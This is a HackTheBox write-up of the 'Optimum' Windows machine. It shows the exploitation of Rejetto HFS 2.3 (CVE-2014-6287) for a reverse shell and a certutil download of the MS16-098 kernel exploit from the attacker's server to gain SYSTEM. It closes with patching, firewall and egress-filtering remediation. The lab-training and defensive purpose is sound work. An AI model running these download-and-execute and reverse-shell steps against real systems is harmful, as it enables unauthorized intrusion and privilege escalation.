---
layout: post
title: HTB Optimum WriteUp
date: 2026-11-18
categories:
  - HackTheBox
  - HackTheBox-Windows
tags:
  - Windows-Server-2012-R2
  - Rejetto-HFS
  - CVE-2014-6287
  - Remote-Code-Execution
  - Windows-Exploit-Suggester
  - Kernel-Exploit
  - MS16-098
  - CVE-2016-3309
  - Integer-Overflow
  - Privilege-Escalation
  - LOLBins
  - Patch-Management
  - Blue-Team
media_subpath: /assets/img/Optimum
---
![Desktop View](Optimum.png){: w="400"  h="400" }

# Optimum Skills

**Optimum CTF** is an Easy Windows machine where we will use the following skills:

- **Web Application & Service Enumeration (`HttpFileServer 2.3`)**
- **Exploiting Rejetto HFS Null Byte RCE (`CVE-2014-6287`)**
- **Windows Post-Exploitation & Patch Enumeration (`Windows-Exploit-Suggester`)**
- **File Transfer via Living-off-the-Land Binaries (`certutil.exe`)**
- **Kernel Privilege Escalation via `RGNOBJ` Integer Overflow (`MS16-098` / `CVE-2016-3309`)**
- **Patch Management & Application Hardening (Blue Team)**
- **Egress Filtering & LOLBin Monitoring (Blue Team)**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **80**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.101.227 -oG allPorts
Host is up, received user-set (0.0083s latency).
Scanned at 2026-11-17 19:04:45 CET for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```

Then I launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p80 10.129.101.227 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-11-17 19:07 +0100
Nmap scan report for 10.129.101.227
Host is up (0.0046s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

So we have to check the following port & service:

- **Port 80 -->  HttpFileServer httpd 2.3**

Let's see what we can find in port 80

---
## Port 80 Enumeration

Let's run `whatweb` to check some headers and important info:

```bash
❯ whatweb 10.129.101.227
http://10.129.101.227 [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.129.101.227], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```

We can see that we are facing a **HTTPFileServer (HFS 2.3)**, since I don't really know what this service is, let's make a quick **Google search**.

- *HFS is a web file server for your computer. Share folders or even a single file thanks to the virtual file system.*

Since we have the version of the service, let's see there is any publicly available exploit for this version.

```bash
❯ searchsploit HFS 2.3
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                                                                                           | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                                                                                           | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                                                                                | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                                                                                        | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                                                                                   | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                                                                                   | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                                                                              | windows/webapps/34852.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

A lot of **exploits**, after some review, I will use the `windows/remote/39161.py`.

Let's download the exploit and check what the requirements are and what the **exploit** does.

```bash
❯ searchsploit -m windows/remote/39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
Copied to: /home/ne4rby/Documents/HTB/Optimum/exploits/39161.py
```

After reading the **script**, these are the **requirements**.

1. Change the **Local IP** and **Local Port** in the script.
2. Open a **webServer** on port 80 hosting `nc.exe`.
3. Open a listener waiting for the **reverse shell**.
4. Execute the **script** multiple times until you receive the **reverse shell** (usually two times, one to download `nc.exe` in the machine and second to verify and execute)

How does the **exploit** work?

The **exploit** abuses **Rejetto** search parser, it mishandles a null byte (%00) and allows remote attackers to gain **remote command execution**.

1. In the first execution, the script downloads `nc.exe` from our local machine, to the target machine.
2. In the second execution, the script injects a command that executes `nc.exe` and sends us a **reverse shell**

Now that we understand the procedure, let's put it in practice. First of all, let's get `nc.exe` in our current directory and host it under **port 80**:

```bash
❯ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

In a second **terminal** let's modify the **Local port** and **Local IP**

```bash
ip_addr = "10.10.17.105" #local IP address
local_port = "443" # Local Port number
```

In a third **terminal**, let's set a listener using `nc`

```bash
❯ rlwrap nc -nvlp 443
Listening on 0.0.0.0 443
```

Once all is ready, we just need to execute the **script** two times with the target **IP address and Target Port** as argvs.

```bash
❯ python2 39161.py 10.129.101.227 80
❯ python2 39161.py 10.129.101.227 80
```

If we check the `nc` listener we will see that we gained a **reverse shell** as `kostas`.

## Shell as kostas

### Privilege Escalation

After some basic enumeration, nothing really dangerous was found, but knowing it's an old version of **Windows**, let's send a `systeminfo.txt` report to `Windows-Exploit-Suggester` and check if there is any exploit available.

```bash
C:\Users\kostas\Desktop>systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          24/11/2026, 4:59:25 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.553 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 5.002 MB
Virtual Memory: In Use:    501 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.101.227
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Just copy/paste the report in a local file named `systeminfo.txt` and download `Windows-Exploit-Suggester` script using `wget`:

```bash
❯ wget https://raw.githubusercontent.com/strozfriedberg/Windows-Exploit-Suggester/refs/heads/master/windows-exploit-suggester.py
--2026-11-17 19:54:48--  https://raw.githubusercontent.com/strozfriedberg/Windows-Exploit-Suggester/refs/heads/master/windows-exploit-suggester.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8002::154, 2606:50c0:8001::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8002::154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69175 (68K) [text/plain]
Saving to: ‘windows-exploit-suggester.py.1’

windows-exploit-suggester.py.1                                100%[=================================================================================================================================================>]  67,55K  --.-KB/s    in 0,03s   

2026-11-17 19:54:49 (2,01 MB/s) - ‘windows-exploit-suggester.py.1’ saved [69175/69175]
```

First of all, we need to update our database.

```bash
❯ ./windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2026-11-17-mssb.xls
[*] done
```

Once completed, we can execute the **script** and read the report afterwards.

```bash
❯ ./windows-exploit-suggester.py --database 2026-11-17-mssb.xls --systeminfo systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]   [REDACTED]
```

I always try the higher exploits first until one works, in this case the second one: **Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098)**, did the job.

After some small research I found the compiled binary for this **exploit**.

First let's download the binary.

```bash
❯ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
--2026-11-17 20:01:42--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
Resolving gitlab.com (gitlab.com)... 2606:4700:90:0:f22e:fbec:5bed:a9b9, 172.65.251.78
Connecting to gitlab.com (gitlab.com)|2606:4700:90:0:f22e:fbec:5bed:a9b9|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 560128 (547K) [application/octet-stream]
Saving to: ‘41020.exe’

41020.exe                                                     100%[=================================================================================================================================================>] 547,00K  --.-KB/s    in 0,02s   

2026-11-17 20:01:42 (25,0 MB/s) - ‘41020.exe’ saved [560128/560128]
```

Now we need to transfer the **binary** into the target machine.

We need to host the **binary** so the target machine can download it.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

For convenience I move myself to `C:\Windows\Temp\PrivEsc`.

```bash
C:\Users\kostas\Desktop>cd C:\Windows\Temp\PrivEsc
```

Then we can download the **binary** using `certutil.exe`.


```bash
C:\Windows\Temp>certutil.exe -f -urlcache -split http://10.10.17.105:80/41020.exe privesc.exe
certutil.exe -f -urlcache -split http://10.10.17.105:80/41020.exe privesc.exe
****  Online  ****
  000000  ...
  088c00
CertUtil: -URLCache command completed successfully.
```

Once with the **binary** in the target machine, we can just execute the **binary** and we should get `nt authority\system` perms.

```bash
C:\Windows\Temp\PrivEsc>privesc.exe
privesc.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\Temp\PrivEsc>whoami
whoami
nt authority\system
```

***Pwned!***

We can now read both flags:

```bash
C:\Users>type C:\Users\kostas\Desktop\user.txt
type C:\Users\kostas\Desktop\user.txt
72772cc3****************f9983ecd

C:\Users>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
d17cd720f************33c1195854c
```

## Remedying and Securing the Machine

In this section, we will secure every attack vector that we have just exploited. Since we already have an active `NT AUTHORITY\SYSTEM` shell on **Optimum** (Windows Server 2012 R2), we can apply the entire remediation directly from the command line.

### 1. Artifact Eviction (Cleaning Up Our Payloads)

First of all, before patching anything, we need to remove the offensive tools we dropped on the target (nc.exe and privesc.exe) so no leftover binaries remain on disk.

1. Delete the uploaded `nc.exe` binary.

```bash
C:\Users\Public> ren C:\Users\Public\nc.exe nc.old
```

2. Delete the kernel exploit folder from `Temp`

```bash
C:\Users\Public> rmdir /S /Q C:\Windows\Temp\PrivEsc
```

3. Purge the certutil URL download cache

```bash
C:\Users\Public> certutil -urlcache * delete
```

### 2. Mitigating Rejetto HFS 2.3 RCE (CVE-2014-6287)

Our initial foothold came from **Rejetto HTTP File Server 2.3** running on port 80.

**Why was it vulnerable?**

HFS 2.3 suffers from a parser flaw when handling null bytes (`%00`) in search queries. When the parser hits `%00`, it assumes the input string has ended and stops sanitizing the rest of the URL, yet the internal template engine keeps processing everything after it. This allowed us to inject HFS macros (`{.exec|...}`) and execute OS commands as `kostas`.

**How to fix it:**

We need to terminate the vulnerable service, upgrade the binary to **Rejetto HFS 2.3m** (or replace it with a properly maintained file-sharing service like IIS or SFTP), and restrict port 80 at the firewall level so it is not exposed to untrusted networks:

1. Stop the vulnerable HFS process

```bash
C:\Users\Public> taskkill /F /IM hfs.exe
```

2. Restrict port 80 strictly to an internal management subnet (e.g., 10.10.10.0/24)

```bash
C:\Users\Public> netsh advfirewall firewall add rule name="Allow Internal HFS" dir=in action=allow protocol=TCP localport=80 remoteip=10.10.10.0/24
C:\Users\Public> netsh advfirewall firewall add rule name="Block External HFS" dir=in action=block protocol=TCP localport=80
```

### 3. Patching the Windows Kernel (MS16-098 / CVE-2016-3309)

Once inside as `kostas`, `Windows-Exploit-Suggester` showed that the server was missing years of critical security updates, letting us escalate straight to `SYSTEM`.

**Why was it vulnerable?**

The flaw lives inside the Windows kernel-mode graphics driver (`win32kfull.sys`), specifically in how `RGNOBJ` handles region objects. Passing crafted values from user mode triggers an **Integer Overflow**, corrupting kernel memory (Ring 0) and allowing our exploit (`41020.exe`) to overwrite our process token with the `SYSTEM` token.

**How to fix it:**

Because this is a native kernel driver bug, there is no registry workaround—we must install Microsoft security patch **KB3178466 (MS16-098)** silently using `wusa.exe` and reboot the server

1. Check if the hotfix is missing

```bash
C:\Users\Public> powershell -Command "Get-HotFix -Id KB3178466"
```

2. Install the downloaded update silently and reboot

```bash
C:\Users\Public> wusa.exe C:\Updates\Windows8.1-KB3178466-x64.msu /quiet /norestart
C:\Users\Public> shutdown /r /t 10
```

>To really secure the machine we should install all the hotfixes reported by `Windows-Exploit-Suggester`.
{: .prompt-warning }


### 4. Defense in Depth: Egress Filtering & Hardening `Temp`

Notice that our entire attack chain relied on the victim machine being able to reach back to our HTTP server twice—first to pull `nc.exe` during the HFS exploit, and second to download `41020.exe` using `certutil.exe` into `C:\Windows\Temp`.

To break this post-exploitation pattern:

1. **Enforce Egress Filtering**: Block unauthorized outbound HTTP/HTTPS connections (ports 80 and 443) so compromised services cannot pull remote payloads or establish reverse shells over standard web ports.

```bash
C:\Users\Public> netsh advfirewall firewall add rule name="Block Outbound HTTP-HTTPS" dir=out action=block protocol=TCP remoteport=80,443
```

2. **Restrict Execution in `Temp`**: Deny execute (X) permissions for standard users inside `C:\Windows\Temp` (or enforce AppLocker rules) so binaries dropped via LOLBins like `certutil.exe` cannot be launched.

```bash
C:\Users\Public> icacls "C:\Windows\Temp" /deny "BUILTIN\Users":(OI)(CI)(X)
```

---
## Final Thoughts

**Optimum** is a straightforward and really fun Windows machine that shows how fast a server can fall when outdated third-party software meets an unpatched OS.

Getting the initial foothold through **Rejetto HFS 2.3** (`CVE-2014-6287`) was super clean—a simple null-byte injection in the search parameter was enough to get command execution and land a shell as `kostas`. From there, running `Windows-Exploit-Suggester` against `systeminfo` made the privilege escalation path crystal clear, leading us straight to the **MS16-098** kernel integer overflow to grab `NT AUTHORITY\SYSTEM`.

On the Blue Team side, **Optimum** is a textbook reminder of why **patch management** has to cover both third-party apps and the underlying OS kernel. It also shows why locking down outbound traffic (**egress filtering**) and restricting execution inside `C:\Windows\Temp` are so effective at breaking the classic `certutil.exe` download-and-execute chain.

---

![Desktop View](OptimumPwn.png)

---
**Thanks for reading! I'd appreciate it if you took a look at my other posts :)**

